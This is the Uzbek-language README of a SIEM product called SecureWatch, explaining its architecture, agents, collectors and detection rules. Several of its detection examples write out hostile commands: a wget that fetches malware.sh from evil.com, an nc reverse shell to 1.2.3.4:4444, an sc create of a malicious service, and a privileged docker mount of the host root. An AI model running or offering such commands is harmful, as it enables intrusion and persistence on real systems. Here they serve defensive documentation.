
<div align="center">

```
███████╗███████╗ ██████╗██╗   ██╗██████╗ ███████╗██╗    ██╗ █████╗ ████████╗ ██████╗██╗  ██╗
██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██╔════╝██║    ██║██╔══██╗╚══██╔══╝██╔════╝██║  ██║
███████╗█████╗  ██║     ██║   ██║██████╔╝█████╗  ██║ █╗ ██║███████║   ██║   ██║     ███████║
╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██╔══╝  ██║███╗██║██╔══██║   ██║   ██║     ██╔══██║
███████║███████╗╚██████╗╚██████╔╝██║  ██║███████╗╚███╔███╔╝██║  ██║   ██║   ╚██████╗██║  ██║
╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝ ╚══╝╚══╝ ╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝
```

# SecureWatch SIEM
### Enterprise-Grade Security Information & Event Management

[![Version](https://img.shields.io/badge/version-4.0.0-blue?style=for-the-badge)](.)
[![Status](https://img.shields.io/badge/status-Production%20Ready-success?style=for-the-badge)](.)
[![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)](.)
[![Docker](https://img.shields.io/badge/Docker-Compose-2496ED?style=for-the-badge&logo=docker)](.)
[![Python](https://img.shields.io/badge/Python-3.10+-3776AB?style=for-the-badge&logo=python)](.)
[![React](https://img.shields.io/badge/React-18-61DAFB?style=for-the-badge&logo=react)](.)

---

*Real vaqt kiberxavfsizlik monitoringi, avtomatik tahdid aniqlash va javob berish tizimi*

</div>

---

## Mundarija

- [SIEM nima? — Oddiy tushuntirish](#-siem-nima--oddiy-tushuntirish)
- [Nima muammoni hal qiladi?](#-nima-muammoni-hal-qiladi)
- [Tizim qanday ishlaydi? — 10 soniyalik jarayon](#-tizim-qanday-ishlaydi--10-soniyalik-jarayon)
- [Arxitektura — Barcha qismlar](#-arxitektura--barcha-qismlar)
- [Agent — Ma'lumot yig'uvchi](#-agent--malumot-yiguvchi)
- [Collectorlar — 24 ta sensor](#-collectorlar--24-ta-sensor)
- [Deteksiya qoidalari — 36 ta](#-deteksiya-qoidalari--36-ta)
- [Ishlov berish quvuri — 8 bosqich](#-ishlov-berish-quvuri--8-bosqich)
- [Active Response — Avtomatik javob](#-active-response--avtomatik-javob)
- [Threat Intelligence — Tahdid ma'lumotlari](#-threat-intelligence--tahdid-malumotlari)
- [Anomaliya deteksiyasi](#-anomaliya-deteksiyasi)
- [Frontend — 16 ta sahifa](#-frontend--16-ta-sahifa)
- [Xavfsizlik qatlamlari](#-xavfsizlik-qatlamlari)
- [Monitoring va sog'liq tekshiruvi](#-monitoring-va-soglik-tekshiruvi)
- [Texnik stack](#-texnik-stack)
- [Biznes foydasi](#-biznes-foydasi)
- [Raqobatchilar bilan taqqoslash](#-raqobatchilar-bilan-taqqoslash)
- [O'rnatish qo'llanmasi](#-ornatish-qollanmasi)
- [Tez-tez so'raladigan savollar](#-tez-tez-soraladigan-savollar)

---

## 🏠 SIEM Nima? — Oddiy Tushuntirish

**SIEM** (Security Information and Event Management) — bu sizning serverlar, kompyuterlar va tarmoq qurilmalarini **real vaqtda kuzatib turadigan** va hujumlarni **avtomatik aniqlaydiagn** tizim.

### Uy xavfsizligi bilan taqqoslash

Tasavvur qiling: sizda katta bir ombor bor. Omborda:
- 50 ta xona bor, har birida eshik bor
- Har kecha kimdir kirishga urinishi mumkin
- Siz hamma xonani bir vaqtda ko'ra olmaysiz

**Oddiy yechim:** Har bir eshikka qo'riqchi qo'yish → Juda qimmat, 50 ta qo'riqchi kerak.

**SIEM yechimi:**
```
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│   Har bir eshikka → Kamera (Agent)                         │
│   Barcha kameralar → Markaziy monitor (SIEM Server)        │
│   Monitor → Avtomatik tahlil (Detection Engine)            │
│   Tahlil → Xabar + Harakat (Alert + Active Response)       │
│                                                             │
│   1 ta opertor 50 ta xonani bir vaqtda kuzatadi!           │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Kiberxavfsizlikda SIEM

```
Ombor = Sizning kompyuter tizimingiz (serverlar, PK'lar)
Eshik  = Login sahifalari, SSH, API, portlar
Kamera = Agent (har bir serverda o'rnatiladi)
Xabar  = Log (har bir hodisa qayd etiladi)
SIEM   = Barcha loglarni tahlil qiluvchi markaziy miya

Har bir harakatni kuzatadi:
  ✓ Kim kirdi?        → auth.log
  ✓ Nima o'zgardi?    → file integrity monitoring
  ✓ Qayerdan keldi?   → IP geolokatsiya
  ✓ Qachon bo'ldi?    → timestamp
  ✓ Xavfli emasmi?    → 36 ta qoida tekshiruvi
```

---

## ❗ Nima Muammoni Hal Qiladi?

### Haqiqiy hujum misoli: SSH Brute Force

Tasavvur qiling, hacker sizning serveringizga kirmoqchi:

```
Hacker:  ssh root@84.8.147.84
Server:  Permission denied (23:41:02)

Hacker:  ssh root@84.8.147.84  (boshqa parol)
Server:  Permission denied (23:41:03)

Hacker:  ssh root@84.8.147.84  (yana boshqa parol)
Server:  Permission denied (23:41:04)

... 60 sekund ichida 500 urinish ...

Hacker:  ssh root@84.8.147.84  (to'g'ri parol topildi!)
Server:  Welcome to Ubuntu 22.04 LTS  ← KIRDI!
```

**SIEM yo'qligida:** Siz buni 2-3 kundan keyin bilasiz (agar bildirilinsa).
**SecureWatch bilan:** 5-chi urinishda → **avtomatik bloklash → sizga xabar.**

### Muammolar va yechimlar jadvali

```
┌──────────────────────┬─────────────────────────────────────────┐
│  MUAMMO              │  SECUREWATCH YECHIMI                    │
├──────────────────────┼─────────────────────────────────────────┤
│ Hujum sezilib        │ 36 ta qoida + Anomaliya deteksiyasi →   │
│ qolmaydi             │ Real vaqt aniqlash (< 60 sekund)        │
├──────────────────────┼─────────────────────────────────────────┤
│ Javob berish sekin   │ Active Response → IP avtomatik          │
│ (qo'lda 15-30 daqiqa)│ bloklash, email xabar (< 5 sekund)     │
├──────────────────────┼─────────────────────────────────────────┤
│ Loglar ko'p, chalkash│ Elasticsearch → 500+ format,            │
│                      │ 90 kun saqlash, 1 sekundda qidiruv      │
├──────────────────────┼─────────────────────────────────────────┤
│ Compliance           │ MITRE ATT&CK, CIS Level 1, STIG →      │
│ talablari            │ Avtomatik hisobotlar, bir tugma          │
├──────────────────────┼─────────────────────────────────────────┤
│ Ko'p server          │ Bitta panel: Windows, Linux, macOS,     │
│ boshqaruvi           │ Docker, Kubernetes agentlari            │
├──────────────────────┼─────────────────────────────────────────┤
│ Ichkaridan hujum     │ Foydalanuvchi xatti-harakatini          │
│ (insider threat)     │ kuzatish, anomal harakatlar aniqlash    │
└──────────────────────┴─────────────────────────────────────────┘
```

### Hal qilinadigan 12 ta tahdid turi

| # | Tahdid | Qanday ishlaydi | Qanday aniqlanadi |
|---|--------|-----------------|-------------------|
| 1 | **SSH Brute Force** | Hacker minglab parol sinab ko'radi | 5+ xato / 60 sek → bloklash |
| 2 | **Password Spray** | 1 parolni minglab userga sinash | 20+ xato / 5 daqiqa → alert |
| 3 | **Rootkit** | Zararli dastur o'zini yashiradi | Yashirin jarayon topilsa → CRITICAL |
| 4 | **Privilege Escalation** | Oddiy user → root bo'lishga urinish | sudo + sudoers o'zgarishi → alert |
| 5 | **Persistence** | Hacker qayta kirish uchun backdoor qo'yadi | Yangi SSH kalit, cron, servis → alert |
| 6 | **Fayl o'zgarishi** | /etc/passwd, sshd_config buzilishi | SHA-256 bazaviy qiymat o'zgardi → alert |
| 7 | **Malware** | Reverse shell, DNS tunnel orqali muloqot | Shubhali tarmoq + DNS → aniqlash |
| 8 | **Zaifliklar** | Eski versiyali dastur → CVE exploit | dpkg/rpm versiya → NVD baza taqqosi |
| 9 | **Ma'lumot o'g'irlash** | USB drive, shubhali yuklab olish | USB event, katta hajm yuklab olish |
| 10 | **Compliance buzilishi** | Qoidalarga zid sozlamalar | CIS/STIG 50+ tekshiruv, avtomat |
| 11 | **Container hujumi** | Docker ichida zararli amal | Container lifecycle monitoring |
| 12 | **Web hujumi** | SQLi, XSS, Path Traversal | Nginx log tahlil, pattern matching |

---

## ⏱️ Tizim Qanday Ishlaydi? — 10 Soniyalik Jarayon

Haqiqiy misol: **SSH Brute Force hujumi aniqlash**

```
00:00 — Hacker 84.33.21.5 IP'dan root@server kirishga urinmoqda

  Agent (server) syslog ni o'qiydi:
  "Failed password for root from 84.33.21.5 port 22 ssh2"

00:01 — Agent logni SIEM serverga yuboradi (HTTP/HTTPS)
  {
    "timestamp": "2026-05-02T23:41:02Z",
    "source":    "/var/log/auth.log",
    "message":   "Failed password for root from 84.33.21.5",
    "hostname":  "web-server-01"
  }

00:01 — Decoder bu logni tahlil qiladi:
  event_type: "ssh_failed_login"
  ssh_user:   "root"
  ssh_src_ip: "84.33.21.5"

00:01 — Threat Intelligence tekshiruvi:
  AbuseIPDB:  84.33.21.5 → Confidence: 87% (shubhali!)
  GeoIP:      Rossiya, Moskva, Rostelecom

00:02 — Qoida tekshiruvi boshlanadi:
  Qoida: "SSH brute force" — 5+ urinish / 60 sekund
  Hozir: 1-urinish → Hisoblagich boshlandi

... 58 sekund o'tadi, 4 ta urinish yana keladi ...

01:00 — 5-urinish! Qoida ishga tushdi!
  ✓ SSH Brute Force detected
  ✓ MITRE: T1110.001 (Brute Force: Password Guessing)
  ✓ Severity: HIGH

01:00 — Active Response ishlaydi:
  1. iptables -A INPUT -s 84.33.21.5 -j DROP  ← IP bloklandi!
  2. Email yuborildi: "SSH Brute Force: 84.33.21.5 bloklandi"
  3. Slack webhook: #security-alerts kanalga xabar

01:01 — PostgreSQL'ga alert yozildi
01:01 — Elasticsearch'da log saqlandi
01:01 — WebSocket orqali dashboard'ga real vaqt xabar keldi
01:01 — Operator ekranida: 🔴 CRITICAL ALERT — SSH Brute Force

Jami vaqt: ~60 sekund (hujum boshlangandan xabargacha)
```

---

## 🏗️ Arxitektura — Barcha Qismlar

### Umumiy ko'rinish

```
                    ┌──────────────────────────────────┐
                    │      INTERNET / LAN               │
                    │   Foydalanuvchilar + Agentlar     │
                    └──────────────┬───────────────────┘
                                   │
                  ┌────────────────▼─────────────────┐
                  │          NGINX                    │
                  │  ← Darvoza (kirish nuqtasi)       │
                  │  Port 8080 (HTTP)                 │
                  │  Port 8443 (HTTPS)                │
                  │  • Rate limiting (hujum to'xtatish)│
                  │  • Security headers               │
                  │  • SSL termination                │
                  └──────────┬─────────────┬──────────┘
                             │             │
               ┌─────────────▼──┐    ┌─────▼──────────────┐
               │   FRONTEND     │    │     BACKEND         │
               │   (React 18)   │    │   (FastAPI/Python)  │
               │                │    │                     │
               │ • 16 ta sahifa │    │ • 100+ API endpoint │
               │ • Real-time WS │    │ • Rule Engine       │
               │ • Charts       │    │ • Detection Engine  │
               │ • Dark/Light   │    │ • Active Response   │
               │   tema         │    │ • 4 Worker process  │
               └────────────────┘    └──────┬──────┬───────┘
                                            │      │
                        ┌───────────────────┘      └──────────────────┐
                        │                                              │
          ┌─────────────▼────────────┐              ┌─────────────────▼──┐
          │      PostgreSQL 15        │              │      Redis 7        │
          │  ← Asosiy ma'lumot bazasi │◄────────────►│  ← Tez kesh        │
          │                          │              │                     │
          │  • Foydalanuvchilar      │              │  • Sessiyalar       │
          │  • Deteksiya qoidalari   │              │  • Rate limit'lar   │
          │  • Alertlar              │              │  • Bloklangan IP'lar│
          │  • Insidentlar (Cases)   │              │  • Anomaliya        │
          │  • Audit log             │              │    bazeline'lari    │
          │  • Active Response       │              │  • WebSocket        │
          │    siyosatlari           │              │    pub/sub kanal    │
          └──────────────────────────┘              └─────────────────────┘
                        │
          ┌─────────────▼──────────────────────┐
          │         Elasticsearch 8.11          │
          │   ← Log saqlash va qidirish         │
          │                                     │
          │  • 500+ format log'lar              │
          │  • 90 kun saqlash (ILM policy)      │
          │  • Full-text qidiruv                │
          │  • Aggregatsiya (statistika)        │
          │  • Kunlik indekslar (siem-logs-DATE)│
          │  • X-Pack Security (auth)           │
          └────────────────────────────────────┘

MONITORING QATLAMI:
┌──────────────┐   ┌──────────────┐   ┌──────────────┐
│  Prometheus  │──►│ Alertmanager │   │   Grafana    │
│  (metrikalar)│   │  (xabarlar)  │   │  (grafalar)  │
│  Port: 9090  │   │  Port: 9093  │   │  Port: 3001  │
└──────────────┘   └──────────────┘   └──────────────┘

AGENTLAR (monitoring qilinadigan serverlar):
┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐
│  Linux   │ │ Windows  │ │  macOS   │ │  Docker  │ │   K8s    │
│ Ubuntu   │ │  10/11   │ │  12+     │ │ Container│ │   Pod    │
│ Debian   │ │ Server   │ │  M1/Intel│ │          │ │          │
│ RHEL     │ │ 2016-22  │ │          │ │          │ │          │
└────┬─────┘ └────┬─────┘ └────┬─────┘ └────┬─────┘ └────┬─────┘
     └────────────┴─────────────┴────────────┴────────────┘
                                │
              HTTPS → Backend API :8080/api/logs/ingest
              (Oflayn bo'lsa → SQLite bufer → keyinroq yuborish)
```

### Har bir komponent nimа qiladi?

**NGINX** — "Darvozabon"
- Barcha trafikni qabul qiladi va to'g'ri joyga yo'naltiradi
- Sekundiga 100+ so'rov kelib qolsa — sekinlashtiradi (rate limiting)
- Zararli so'rovlarni bloklaydi (`.git`, `.env` fayllarni himoya qiladi)

**Backend (FastAPI)** — "Miya"
- Barcha mantiqni bajaradi
- Agentlardan ma'lumot qabul qiladi
- Qoidalarni tekshiradi
- Alertlar yaratadi
- Active Response ishga tushiradi

**Frontend (React)** — "Ko'z"
- Operator ko'radigan panel
- Real vaqtda alertlar ko'rsatadi (WebSocket)
- Grafalar, jadvallar, qidiruv

**PostgreSQL** — "Asosiy xotira"
- Doimiy ma'lumotlar: foydalanuvchilar, qoidalar, alertlar
- O'chib qolmaydi, disk'da saqlanadi

**Elasticsearch** — "Log arxivi"
- Barcha loglar shu yerda saqlanadi
- Millionlab logdan bir sekundda qidiruv
- 90 kundan keyin avtomatik o'chirish

**Redis** — "Tez xotira"
- Sessiyalar (kim tizimga kirgan)
- Rate limit hisoblagichlari
- Bloklangan IP ro'yxati
- WebSocket xabarlarini ko'p serverga tarqatish

---

## 🤖 Agent — Ma'lumot Yig'uvchi

Agent — bu monitoringqilinadigan har bir serverga o'rnatilgan **kichik Python dasturi**.

### Agent nimа qiladi?

```
Server ichida Agent nima kuzatadi:

  📄 Loglar:        /var/log/auth.log, syslog, nginx, custom
  🔧 Jarayonlar:    Yangi ishga tushgan dasturlar
  📁 Fayllar:       Kritik fayllar o'zgarganmi?
  🌐 Tarmoq:        Shubhali ulanishlar bormi?
  💻 Tizim:         CPU, RAM, disk qancha?
  🔑 Windows:       Event Log, Registry o'zgarishlari
  🐳 Docker:        Container ishga tushishi/to'xtashi
```

### Oflayn bufer — Internet uzilsa nima bo'ladi?

```
Normal holat:
  Agent → [HTTP] → SIEM Server   ← log darhol yetib boradi

Internet uzildi:
  Agent → [HTTP] → ❌ SIEM Server mavjud emas
  Agent → [SQLite fayl] → Log saqlanadi (gzip bilan siqiladi)
  ...vaqt o'tadi...

Internet qayta ulandi:
  Agent → [HTTP] → SIEM Server   ← to'plangan loglar yuboriladi
  Hech qanday ma'lumot yo'qolmadi!
```

### Agent ishlash parametrlari

```
Batch hajmi:     100 hodisa bir vaqtda (server yuklarini kamaytiradi)
Yurak urishi:    30 sekund (agent tirik ekanini bildiradi)
CPU sarfi:       < 0.5% (agent sezilmaydi)
RAM sarfi:       < 256 MB
Yuborish:        HTTPS (shifrlangan kanal)
Autentifikatsiya: Agent Secret (har bir agent o'z maxfiy kalitiga ega)
```

### O'rnatish platformalari

```
┌─────────────┬──────────────────────────────────────────────────┐
│  Linux      │ Ubuntu 20+, Debian 11+, RHEL/CentOS 8+,         │
│             │ Amazon Linux 2/2023, Fedora 36+                 │
│             │ O'rnatish: curl | bash (30 sekund)              │
├─────────────┼──────────────────────────────────────────────────┤
│  Windows    │ Windows 10/11, Server 2016/2019/2022            │
│             │ Task Scheduler orqali ishga tushadi             │
│             │ (pywin32 DLL talab qilmaydi — muammosiz)        │
│             │ O'rnatish: PowerShell one-liner                 │
├─────────────┼──────────────────────────────────────────────────┤
│  macOS      │ macOS 12+ (Monterey), Intel + Apple Silicon M1/2│
│             │ LaunchDaemon (tizim darajasi, reboot'dan keyin  │
│             │ avtomatik ishga tushadi)                        │
│             │ O'rnatish: curl | bash                          │
├─────────────┼──────────────────────────────────────────────────┤
│  Docker     │ Konteyner lifecycle, loglar, image monitoring   │
│             │ Docker socket orqali                            │
├─────────────┼──────────────────────────────────────────────────┤
│  Kubernetes │ Pod/Deployment hodisalar, K8s API               │
└─────────────┴──────────────────────────────────────────────────┘
```

---

## 📡 Collectorlar — 24 ta Sensor

Har bir collector — bu agent ichidagi **maxsus sensor**. Har biri bitta narsani chuqur kuzatadi.

### 1. Log Kollektorlar (5 ta)

#### `log_collector.py` — Fayl Log'larini O'quvchi
```
Nima qiladi:
  /var/log/auth.log     ← SSH login/logout
  /var/log/syslog       ← Tizim hodisalari
  /var/log/nginx/*.log  ← Web so'rovlar
  /var/log/custom.log   ← Siz ko'rsatgan istalgan fayl
  JSON, syslog RFC5424, CEF formatlarini tushunadi

Misol log:
  May 02 23:41:02 server sshd: Failed password for root from 84.33.21.5

Collector bu logni ajratadi:
  event:   ssh_failed_login
  user:    root
  src_ip:  84.33.21.5
  time:    2026-05-02T23:41:02Z
```

#### `journald_collector.py` — Linux Systemd Jurnali
```
Nima qiladi:
  systemd-based Linux tizimlarida barcha xizmatlar jurnalini o'qiydi
  journalctl buyrug'idan foydalanadi
  Strukturali JSON formatda chiqaradi

Nima uchun kerak:
  Zamonaviy Ubuntu/Debian/RHEL systemd ishlatadi
  Loglar faylda emas, binary format'da saqlanadi
  Bu collector ularni o'qib SIEM'ga yuboradi
```

#### `windows_events.py` — Windows Event Log
```
Nima kuzatadi:
  Event ID 4624  → Muvaffaqiyatli login
  Event ID 4625  → Muvaffaqiyatsiz login (brute force!)
  Event ID 4688  → Yangi jarayon boshlandi
  Event ID 4698  → Yangi Scheduled Task (persistence!)
  Event ID 4720  → Yangi foydalanuvchi yaratildi
  Event ID 7045  → Yangi Windows Service o'rnatildi
  Event ID 1102  → Audit log tozalandi (yashirishga urinish!)
  ...va yana 290+ event ID

  Sysmon (o'rnatilgan bo'lsa):
    Event 1  → ProcessCreate
    Event 3  → NetworkConnect
    Event 11 → FileCreate
    Event 13 → RegistrySet
    ...29 ta Sysmon hodisa turi
```

#### `macos_collector.py` — macOS Unified Logging
```
Nima kuzatadi:
  unified logging system (log stream buyrug'i)
  BSM (Basic Security Module) audit events
  sudo, su, foydalanuvchi kirish/chiqish
  Gatekeeper to'siqlari (imzosiz dastur ishga tushirishga urinish)
```

#### `auditd_collector.py` — Linux Audit Daemon
```
Nima kuzatadi:
  SYSCALL → Tizim chaqiruvlari (execve, open, connect...)
  EXECVE  → Qaysi buyruq qanday argument bilan ishga tushdi
  PATH    → Qaysi fayl ochildi/o'zgartirildi
  USER_LOGIN, USER_LOGOUT → Kirish/chiqish

Misol: Hacker "wget http://evil.com/malware.sh" buyrug'ini berdi
  auditd buni ushlab qoladi:
    syscall=execve exe=/usr/bin/wget args="http://evil.com/malware.sh"
  SecureWatch → CRITICAL alert
```

### 2. Tizim Monitoringi (4 ta)

#### `system_collector.py` — Resurs Kuzatuvi
```
Nima o'lchaydi (har 60 sekund):
  CPU:    95% → Anormal (cryptominer bormi?)
  RAM:    85% → Xotira tugayapti
  Disk:   90% → To'lib qolmoqda
  Tarmoq: 1 GB/s upload → Ma'lumot o'g'irlanmoqdami?

Grafana'da grafik ko'rinishi
Prometheus alert: 85% RAM → SMS/email
```

#### `process_monitor.py` — Jarayon Kuzatuvi
```
Nima kuzatadi:
  Yangi jarayon boshlanganda:
    PID, dastur nomi, yo'l, argument, parent PID, user

Nima uchun muhim:
  Normal: /usr/sbin/sshd → Oddiy SSH daemon
  Shubhali: /tmp/.x → Yashirin fayl ishga tushdi
  Xavfli: nc -e /bin/bash 1.2.3.4 4444 → Reverse shell!

Imtiyoz kuzatuvi:
  Agar oddiy user root bo'lib qolsa → CRITICAL alert
```

#### `network_monitor.py` — Tarmoq Kuzatuvi
```
Nima kuzatadi:
  Yangi ulanishlar (netstat/ss)
  Tashqi IP'larga ulanish
  Noto'g'ri portlarga ulanish
  C2 beacon aniqlash (muntazam interval bilan ulanish)

C2 (Command & Control) beacon misoli:
  Malware har 5 daqiqada hacker serveriga "salom" deydi
  SecureWatch: "Bu IP bilan 12 marta ulanish — SHUBHALI!"
```

#### `dns_monitor.py` — DNS Kuzatuvi
```
Nima kuzatadi:
  DNS so'rovlarini tahlil qiladi
  
DNS Tunneling aniqlash:
  Normal DNS: google.com → IP
  Tunnel DNS: aGVsbG8gd29ybGQ.evil.com → Bu aslida "hello world"
  Hacker DNS orqali ma'lumot o'g'irlaydi!
  SecureWatch: Base64 encoded subdomain → SHUBHALI

DGA (Domain Generation Algorithm) aniqlash:
  Malware random domenlar yaratadi: xkj3m2p.com, 9qwe8r.net
  SecureWatch: Entropy tahlili → Tasodifiy domen → ALERT
```

### 3. Xavfsizlik Sensorlari (5 ta)

#### `file_integrity.py` — Fayl Yaxlitligi Tekshiruvi (FIM)
```
Qanday ishlaydi:
  1. Baseline yaratish:
     /etc/passwd    → SHA-256: abc123...
     /etc/sudoers   → SHA-256: def456...
     /etc/sshd_conf → SHA-256: ghi789...

  2. Har N daqiqada tekshirish:
     /etc/passwd    → SHA-256: abc123... ✓ O'zgarmagan
     /etc/sudoers   → SHA-256: ZZZ999... ✗ O'ZGARDI! → CRITICAL ALERT
     
Nima uchun muhim:
  Hacker /etc/sudoers ga o'zini qo'shsa → root bo'lib oladi
  FIM buni 5 daqiqa ichida aniqlaydi
```

#### `fim_realtime.py` — Real Vaqt FIM
```
file_integrity.py dan farqi:
  Har N daqiqada emas, DARHOL aniqlaydi!
  
Texnologiya:
  Linux:   inotify (kernel darajasida fayl o'zgarish xabari)
  macOS:   FSEvents (Apple tizimi)
  Windows: ReadDirectoryChangesW (Windows API)

Misol:
  Hacker /etc/cron.d/backdoor fayl yaratdi
  inotify: "CREATE event: /etc/cron.d/backdoor"
  SecureWatch: 0 sekund ichida alert!
```

#### `windows_registry_fim.py` — Windows Registry Kuzatuvi
```
Nima kuzatadi:
  HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    → Bu kalit ishga tushishda dastur o'rnatadi
    → Hacker bu yerga malware qo'shadi (persistence!)
  
  HKLM\System\CurrentControlSet\Services
    → Windows xizmatlari
    → Yangi xizmat o'rnatilsa → SHUBHALI

  Boshqa persistence kalitlar (50+ kalit kuzatiladi)
```

#### `rootcheck.py` — Rootkit Aniqlash
```
Nima tekshiradi:
  1. Yashirin jarayonlar:
     /proc da ko'ringan PID'lar vs ps buyrug'i PID'lari
     Farq bo'lsa → Rootkit yashiryapti!
  
  2. LD_PRELOAD hijacking:
     Bu texnika yordamida hacker tizim kutubxonalarini almashtiradi
     /etc/ld.so.preload → G'ayrioddiy fayl bormi?
  
  3. SUID/SGID fayllar:
     find / -perm -4000 → Root imtiyozli fayllar ro'yxati
     Yangi SUID fayl → Imtiyoz oshirish vositasi!
  
  4. Kernel modullar:
     lsmod → Yuklangan modullar
     Noma'lum modul → CRITICAL alert
```

#### `windows_service_monitor.py` — Windows Xizmat Kuzatuvi
```
Nima kuzatadi:
  Yangi xizmat o'rnatilishi
  Xizmat binary-path o'zgarishi (DLL hijacking!)
  Xizmat foydalanuvchi o'zgarishi (SYSTEM bo'lib ishlash)

Hujum misoli:
  Hacker: sc create malware binPath="C:\Temp\evil.exe" start=auto
  Windows Service Monitor: Yangi xizmat "malware" → C:\Temp\evil.exe
  → CRITICAL alert
```

### 4. Zaiflik va Compliance (2 ta)

#### `vuln_scanner.py` — Zaiflik Skaneri
```
Qanday ishlaydi:
  1. Serverdagi barcha paketlarni ro'yxatga oladi:
     Linux: dpkg -l (Debian) yoki rpm -qa (RHEL)
     Python: pip list
     Node.js: npm list
     Windows: Registry SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall

  2. Har bir paket versiyasini NVD (NIST CVE bazasi) bilan taqqoslaydi

  3. Mos kelsa → Alert yaratadi:
     "openssl 1.1.1t → CVE-2023-0215 (HIGH, Score: 7.5)"

  4. Remediation tavsiya:
     "apt upgrade openssl" yoki "yum update openssl"

Nima uchun muhim:
  Cisco, Microsoft, Google — hamma dasturda zaiflik bo'ladi
  Ko'pchilik hujumlar eski versiyalardan foydalanadi
  Avtomatik kuzatuv → O'z vaqtida yangilash
```

#### `sca_collector.py` — Compliance Tekshiruvi
```
CIS Benchmark Level 1 (50+ tekshiruv):
  ✓ SSH root login o'chirilganmi?          (PermitRootLogin no)
  ✓ Parol siyosati qat'iyatasmi?           (min 12 belgi)
  ✓ Firewall yoqilganmi?                   (ufw/firewalld)
  ✓ Keraksiz xizmatlar o'chirilganmi?      (telnet, rsh, ftp)
  ✓ Audit log yoqilganmi?                  (auditd running)
  ✓ /tmp noexec bilan o'rnatilganmi?       (mount options)
  ...va yana 44+ tekshiruv

STIG (Security Technical Implementation Guide):
  US Mudofaa vazirligi standartlari
  Davlat tizimlar uchun majburiy
  SecureWatch avtomatik tekshiradi va hisobot beradi
```

### 5. Inventarizatsiya (2 ta)

#### `inventory_collector.py` — Server Inventarizatsiyasi
```
Nima to'playdi (har 24 soatda):
  Paketlar:    Barcha o'rnatilgan dasturlar (nom + versiya)
  Portlar:     Qaysi portlar ochiq, qaysi dastur tinglayapti
  Jarayonlar:  Hozir ishlaydigan dasturlar ro'yxati
  Interfeys:   Tarmoq kartalar, IP'lar, MAC adreslar

Delta kuzatuvi:
  Kecha: port 80, 443, 22 ochiq
  Bugun: port 80, 443, 22, 4444 ochiq
  → Yangi port 4444 — SHUBHALI! (Netcat/reverse shell port)
```

#### `docker_collector.py` — Docker Kuzatuvi
```
Nima kuzatadi:
  Container ishga tushishi:  Kim, qachon, qaysi image
  Container to'xtashi:       Normal to'xtash yoki crash?
  Image yuklab olish:        G'ayrioddiy image (malicious?)
  Volume mount:              Nozik fayllar mount qilinganmi?
  Network:                   Container tashqariga ulanyaptimi?

Xavfli misol:
  docker run --privileged -v /:/host ubuntu /bin/bash
  → "--privileged" + "/" mount → CRITICAL (host root access!)
```

### 6. Boyitish Kollektorlari (4 ta)

#### `geoip.py` — Geolokatsiya
```
Qanday ishlaydi:
  IP adres → MaxMind GeoIP2 DB → Mamlakat, shahar, ASN

Misol:
  84.33.21.5 → Россия (RU), Москва, Rostelecom (AS12389)

Dashboard'da:
  Dunyo xaritasida hujum manbalari ko'rinadi
  "Bu oy eng ko'p hujum: Xitoy (342), Rossiya (218)"
```

#### `threat_intel.py` — Tahdid Razvedkasi
```
Tekshiruv manbalari:
  AbuseIPDB:  IP shikoyatlar bazasi (50M+ yozuv)
    → "84.33.21.5: 87% confidence, 342 shikoyat"
  
  Firehol:    Ma'lum yomon IP'lar ro'yxati (offline)
    → "1.2.3.4: Firehol Level 1 (tor exit node)"
  
  VirusTotal: Domain/URL tekshiruv
    → "evil.com: 23/70 antivirus aniqladi"

Log boyitish:
  {src_ip: "84.33.21.5"} + threat intel =
  {
    src_ip: "84.33.21.5",
    geo_country: "Russia",
    abuse_score: 87,
    is_malicious: true,
    isp: "Rostelecom"
  }
```

#### `correlation.py` — Ko'p Hodisa Korrelyatsiyasi
```
Nima qiladi:
  Alohida ko'ringan hodisalarni bog'laydi va hujum zanjirini ko'rsatadi

Misol — Lateral Movement Pattern:
  14:01  SSH muvaffaqiyatsiz login (server-A → server-B)
  14:03  SSH muvaffaqiyatsiz login (server-A → server-C)
  14:05  SSH muvaffaqiyatsiz login (server-A → server-D)
  14:06  SSH muvaffaqiyatli login! (server-A → server-B)
  14:07  Yangi foydalanuvchi yaratildi (server-B da)
  14:08  /etc/sudoers o'zgartirildi (server-B da)

  Har bir hodisa alohida "o'rtacha" ko'rinadi
  Korrelyatsiya barchasini bog'laydi:
  → "Lateral Movement + Privilege Escalation zanjiri aniqlandi!"
  → CRITICAL INCIDENT yaratildi
```

#### `dedup.py` — Takrorlanishni Oldini Olish
```
Nima qiladi:
  Bir xil hodisalar yuzlab marta kelmasligi uchun filtrlaydi

Misol:
  Hacker har sekund urinmoqda → 3600 ta hodisa / soat
  Dedup: "Bularning hammasi bir xil → 1 ta alert yarat"
  
Rolling window (sirg'anuvchi oyna):
  5 daqiqa ichida bir xil hodisa → bitta alert
  Har 5 daqiqada hisoblagich sıfırlınar
```

---

## 🎯 Deteksiya Qoidalari — 36 ta

### Qoidalar qanday yoziladi?

Har bir qoida YAML formatida:

```yaml
# SSH Brute Force misoli
id: ssh_brute_force
name: "SSH Brute Force Attack"
description: "Ko'p muvaffaqiyatsiz SSH login urinish"
severity: HIGH
enabled: true

# Shart: qaysi logda, qaysi pattern
match:
  source: auth.log
  message: ~Failed password           # ~ = regex

# Chastota: N ta hodisa M sekund ichida
frequency:
  count: 5
  window: 60
  group_by: [agent_id, src_ip]        # Har IP uchun alohida hisoblash

# Bajarilsa nimа qilsin
action:
  block_ip: 3600                      # 3600 sekund = 1 soat bloklash
  notify: [email, slack]

# MITRE ATT&CK teglash
mitre:
  tactic: "Credential Access"
  technique: "T1110.001"
```

### Barcha 36 ta Qoida

#### Autentifikatsiya Qoidalari (6 ta)

| Qoida | Daraja | Shart | Harakat |
|-------|--------|-------|---------|
| SSH Brute Force | HIGH | 5+ xato/60sek bitta IP'dan | IP bloklash, email |
| Password Spray | HIGH | 20+ xato/5min ko'p userga | Alert, bloklash |
| Root SSH Login | CRITICAL | Root user SSH bilan kirdi | DARHOL alert |
| Invalid User SSH | MEDIUM | Noma'lum user SSH urinishi | Log, alert |
